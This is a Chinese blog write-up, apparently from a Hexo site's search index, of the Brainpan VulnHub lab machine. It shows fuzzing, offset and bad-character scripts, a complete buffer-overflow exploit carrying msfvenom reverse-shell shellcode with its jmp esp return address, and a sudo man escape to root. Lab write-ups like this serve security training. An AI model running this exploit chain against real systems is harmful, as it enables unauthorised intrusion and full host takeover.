<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>1_brainpan_vulnhub</title>
      <link href="/posts/229625f.html"/>
      <url>/posts/229625f.html</url>
      
        <content type="html"><![CDATA[<p>brainpan是vulnhub上一个类OSCP风格的靶机。<br>靶机下载地址：<a href="https://www.vulnhub.com/entry/brainpan-1,51/">https://www.vulnhub.com/entry/brainpan-1,51/</a></p><hr><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>首先用nmap扫描靶机开放端口，同时打印banner信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">--script</span> banner <span class="token number">192.168</span>.71.145<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102084915741.png" alt="扫描结果"></p><p>发现靶机开放了9999和10000两个端口。其中10000端口是HTTP服务，9999端口未知，可以尝试用telnet先接入一下。</p><p><img src="/posts/229625f/image-20221102090022123.png" alt="10000端口页面"></p><p><img src="/posts/229625f/image-20221102090054346.png" alt="连接9999端口"></p><p>10000端口看一下网页源码，没发现特别之处。9999端口让输入密码，其它也没什么了。</p><p><img src="/posts/229625f/image-20221102090144519.png" alt="10000端口网页源码"></p><h3 id="目录探测"><a href="#目录探测" class="headerlink" title="目录探测"></a>目录探测</h3><p>利用kali自带的DIRB工具对web目录进行探测。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.71.145:10000 <span class="token parameter variable">-w</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102090246342.png" alt="目录探测"></p><p>发现一个&#x2F;bin目录，访问看看。</p><p><img src="/posts/229625f/image-20221102090352185.png" alt="目录"></p><p>发现一个exe文件，将它下载下来在win7虚拟机里面运行。</p><p><img src="/posts/229625f/image-20221102090424651.png" alt="运行brainpan文件"></p><p>看样子是一个在监听9999端口的程序。<br>用IDA程序可以很容易得看出这个程序存在strcpy()这个危险函数且存在缓冲区溢出漏洞。</p><p><img src="/posts/229625f/image-20221102090510764.png"></p><p><img src="/posts/229625f/image-20221102090518914.png"></p><p>但是在OSCP考试中不允许使用IDA Pro，因此可以先利用strings查看程序中的字符串，看是否存在危险函数。</p><p><img src="/posts/229625f/image-20221102091347540.png"></p><p>发现存在strcpy()危险函数，可能存在缓冲区溢出漏洞。</p><h2 id="2-验证缓冲区溢出漏洞"><a href="#2-验证缓冲区溢出漏洞" class="headerlink" title="2.验证缓冲区溢出漏洞"></a>2.验证缓冲区溢出漏洞</h2><p>验证缓冲区溢出漏洞的基本思路：<br>利用代码进行fuzz找出是否存在缓冲区溢出漏洞（即查看能否控制EIP），并进行之后的确定偏移量、确定返回地址、生成shellcode。</p><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><p>向目标程序发送很长的字符串，直到程序崩溃，确认导致程序崩溃的大概字符串长度。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> sockethost<span class="token operator">=</span><span class="token string">'192.168.71.146'</span>port<span class="token operator">=</span><span class="token number">9999</span><span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b"A"</span><span class="token punctuation">]</span>counter <span class="token operator">=</span> <span class="token number">100</span><span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">50</span><span class="token punctuation">:</span>    <span class="token builtin">buffer</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">b"A"</span> <span class="token operator">*</span> counter<span class="token punctuation">)</span>    counter <span class="token operator">=</span> counter <span class="token operator">+</span> <span class="token number">100</span><span class="token keyword">for</span> string <span class="token keyword">in</span> <span class="token builtin">buffer</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Fuzzing PASS with &#123;&#125; bytes"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>string<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102092317432.png"></p><p><img src="/posts/229625f/image-20221102092332545.png"></p><p><img src="/posts/229625f/image-20221102092353514.png"></p><p><img src="/posts/229625f/image-20221102092410868.png"></p><p>当发送字符串长度为600字节时，程序崩溃。在debugger中可以看到栈和EIP都被“A”（0x41）填满，即控制了EIP，使其指向了非法地址。</p><h3 id="确定偏移量"><a href="#确定偏移量" class="headerlink" title="确定偏移量"></a>确定偏移量</h3><p>确定多长的字符串可以刚好覆盖EIP。<br>利用kali的工具msf-pattern_create创建长度为600的字符串，发送给程序。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf-pattern_create <span class="token parameter variable">-l</span> <span class="token number">600</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102092513918.png"></p><p><img src="/posts/229625f/image-20221102092528409.png"></p><p>发送完成后，发现EIP的值为35724134<br>利用msf-pattern_offset 工具确认偏移位置，偏移为524。</p><p><img src="/posts/229625f/image-20221102092605952.png"></p><h3 id="确定返回地址"><a href="#确定返回地址" class="headerlink" title="确定返回地址"></a>确定返回地址</h3><p>通过构造发送的字符串，EIP覆盖为想要跳转执行的代码。<br>当EIP执行”jmp esp”时，程序会接下来跳转到esp所指向的内存执行，实际上就是“返回地址”在栈里的上一个地址，由于操作系统保护机制，esp的地址是不能写死的，所以要找到程序中有没有“jmp esp”的地址可以利用。<br>这里要用到Immunity Debugger的mona插件，下载地址：<a href="https://github.com/corelan/mona">https://github.com/corelan/mona</a></p><p>安装好后，在debugger下方的指令框中输入！mona modules，它会显示出所有运行程序的保护机制开启情况。选择前四项都为false的程序，就是可进行代码地址利用的程序。</p><p><img src="/posts/229625f/image-20221102092810528.png"></p><p>看到brainpan.exe程序可以利用，使用nasm_shell来获得jmp esp的十六进制指令：</p><p><img src="/posts/229625f/image-20221102092838800.png"></p><p>为”\xff\xe4”，使用mona来寻找指令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona <span class="token function">find</span> <span class="token parameter variable">-s</span> <span class="token string">"<span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xe4">\xe4</span>"</span> <span class="token parameter variable">-m</span> brainpan.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102092928811.png"></p><p>找到了指令的位置为0x311712f3<br>因为brainpan为windows 32位小端序，所以传入EIP的值应该为\xf3\x12\x17\x31</p><h3 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h3><p>在生成shellcode前，要确定程序中有哪些“坏字符”，即不能作为代码使用的字符，每个程序中是不一样的，要在生成shellcode时避免这些字符导致的反弹shell失败。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> sockethost<span class="token operator">=</span><span class="token string">'192.168.71.146'</span>port<span class="token operator">=</span><span class="token number">9999</span>badchars <span class="token operator">=</span> <span class="token punctuation">(</span>        <span class="token string">b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x00"</span>        <span class="token string">b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x10"</span>        <span class="token string">b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x20"</span>        <span class="token string">b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x30"</span>        <span class="token string">b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x40"</span>        <span class="token string">b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x50"</span>        <span class="token string">b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x60"</span>        <span class="token string">b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x70"</span>        <span class="token string">b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x80"</span>        <span class="token string">b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x90"</span>        <span class="token string">b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xa0"</span>        <span class="token string">b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xb0"</span>        <span class="token string">b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xc0"</span>        <span class="token string">b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xd0"</span>        <span class="token string">b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xe0"</span>        <span class="token string">b"\xe1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\xf0"</span><span class="token punctuation">)</span>buff <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">524</span> <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> badcharss <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在esp处右键“follow in dump”中可以看到填入的badchars，但是发现在”\x00”处被截断了，不是本来的”\x11”，说明”\x00”是坏字符。<br>将”\x00”改成”\x01”再次发送，经过排查一切正常，没有其他的坏字符了。</p><p>利用kali的msfvenom生成shellcode，记得加-b参数排除掉坏字符。<br>直接生成靶机linux系统的shellcode。</p><p><img src="/posts/229625f/image-20221102093030822.png"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>发送给靶机，再加一段nop雪橇保护shellcode。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> socketip <span class="token operator">=</span> <span class="token string">"192.168.71.145"</span>port <span class="token operator">=</span> <span class="token number">9999</span>addr <span class="token operator">=</span> <span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>buf <span class="token operator">=</span>  <span class="token string">b""</span>buf <span class="token operator">+=</span> <span class="token string">b"\xdb\xc4\xd9\x74\x24\xf4\xb8\x81\xbe\x52\xf0\x5e\x2b"</span>buf <span class="token operator">+=</span> <span class="token string">b"\xc9\xb1\x12\x83\xee\xfc\x31\x46\x13\x03\xc7\xad\xb0"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x05\xf6\x0a\xc3\x05\xab\xef\x7f\xa0\x49\x79\x9e\x84"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x2b\xb4\xe1\x76\xea\xf6\xdd\xb5\x8c\xbe\x58\xbf\xe4"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x80\x33\x78\x7f\x68\x46\x87\x6e\x35\xcf\x66\x20\xa3"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x9f\x39\x13\x9f\x23\x33\x72\x12\xa3\x11\x1c\xc3\x8b"</span>buf <span class="token operator">+=</span> <span class="token string">b"\xe6\xb4\x73\xfb\x27\x26\xed\x8a\xdb\xf4\xbe\x05\xfa"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x48\x4b\xdb\x7d"</span>buff <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">524</span> <span class="token operator">+</span> <span class="token string">b'\xf3\x12\x17\x31'</span> <span class="token operator">+</span> <span class="token string">b"\x90"</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> bufs <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Payload send complete!"</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送完成后，kali收到来自靶机的连接，成功反弹shell！</p><h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><p>可以用下面的命令切换成tty.不然的话会没有上下文环境，很多命令执行不了。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">"__import__('pty').spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102093155747.png"></p><p>从反弹的shell中可以看到当前权限为名为punk的用户。<br><strong>sudo -l 命令</strong>：查看授权的命令列表<br>可以看到&#x2F;home&#x2F;anansi&#x2F;bin&#x2F;anansi_util 命令可以无密码执行。</p><p><img src="/posts/229625f/image-20221102093222310.png"></p><p>执行一下这个命令</p><p><img src="/posts/229625f/image-20221102093320764.png"></p><p>依次执行看了一下，三个参数分别相当于以下命令</p><ul><li>ip a&#x2F;ipconfig 命令</li><li>top</li><li>man</li></ul><p>利用man命令进行权限提升，先执行man，再执行!&#x2F;bin&#x2F;sh，获得root权限。</p><p><img src="/posts/229625f/image-20221102093633412.png"></p><p>查看root文件夹下的证明文件b.txt</p><p><img src="/posts/229625f/image-20221102093708826.png"></p><p><strong>恭喜VulnHub的第一台靶机完成！！！！</strong></p>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
